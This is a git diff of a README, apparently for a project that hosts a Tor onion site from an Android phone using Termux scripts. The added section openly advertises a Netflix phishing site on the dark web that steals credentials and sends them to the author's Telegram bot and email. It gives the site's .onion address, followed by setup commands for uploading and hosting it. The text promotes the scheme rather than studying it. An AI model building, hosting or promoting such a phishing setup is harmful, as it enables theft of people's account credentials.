@@ -1,7 +1,23 @@
-># `Hosting from Android Phone`
->
->![image](https://github.com/imvickykumar999/Host-DarkWeb-on-Android/assets/50515418/643557fc-6ef6-43b1-9d5e-34122719cdc3)
->![fb phishing spoof](https://github.com/imvickykumar999/Host-DarkWeb-on-Android/assets/50515418/1a391517-9cb0-4382-b528-d3aa5349f5f0)
+
+# `Latest Project` : `Dark Web`
+
+```python
+Made with ❤️
+Netflix Phishing Website Hosted on Dark Web
+
+Server:
+Running on Android Phone 24x7 via Termux
+
+Working:
+Steels credentials and sends to my Telegram Bot and on Email
+
+URL:
+w5swpnkq6ml5k6fq5vwp3o7izcpthm5d4ivhm44phuunsbpfr75ii2yd.onion
+```
+
+<br>
+
+>![image](https://github.com/imvickykumar999/imvickykumar999/assets/50515418/680e5cd4-b567-45f7-bdd7-47abb8549786)
 
 <br>
 
@@ -26,12 +42,20 @@ chmod +x *
 bash UploadWeb
 
 web
-
-bash HostOnion
 ```
 
-    # to remove folder when it's not empty.
-    rm -rf HostDarkWeb
+      bash HostOnion
+
+<br>
+
+      # to remove folder when it's not empty.
+      rm -rf HostDarkWeb
+
+<br>
+
+# `Hosting from Android Phone`
+
+![image](https://github.com/imvickykumar999/Host-DarkWeb-on-Android/assets/50515418/643557fc-6ef6-43b1-9d5e-34122719cdc3)
 
 <br>
 
